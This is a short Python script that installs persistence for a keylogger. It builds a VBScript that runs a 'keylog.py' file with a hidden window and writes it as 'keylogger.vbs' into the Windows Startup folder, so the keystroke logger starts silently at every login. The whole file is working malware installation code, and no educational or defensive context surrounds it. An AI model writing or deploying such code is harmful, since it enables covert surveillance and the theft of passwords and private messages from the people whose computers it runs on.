from dotenv import load_dotenv
import os
import sys

# Load environment variables from .env file
load_dotenv()

# Get the Python executable path
python_path = sys.executable

# Get the script path from the environment variable
script_path = os.getenv('PATH_TO_REPO')

# check for script path
if script_path is None:
    print('Please set the PATH_TO_REPO environment variable to the path of the script you want to run')
    sys.exit(1)

script_path = script_path + '\\keylog.py'

# Escape the backslashes in the paths
python_path = python_path.replace('\\', '\\\\')
script_path = script_path.replace('\\', '\\\\')

# Create the VBScript command
vbs_script = f'''
CreateObject("Wscript.Shell").Run """" & "{python_path}" & """" & " " & """" & "{script_path}" & """", 0, False
'''

# Get the path to the startup folder
startup_folder = os.path.expanduser('~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')

# Write the command to the VBScript file in the startup folder
with open(os.path.join(startup_folder, 'keylogger.vbs'), 'w') as f:
    f.write(vbs_script)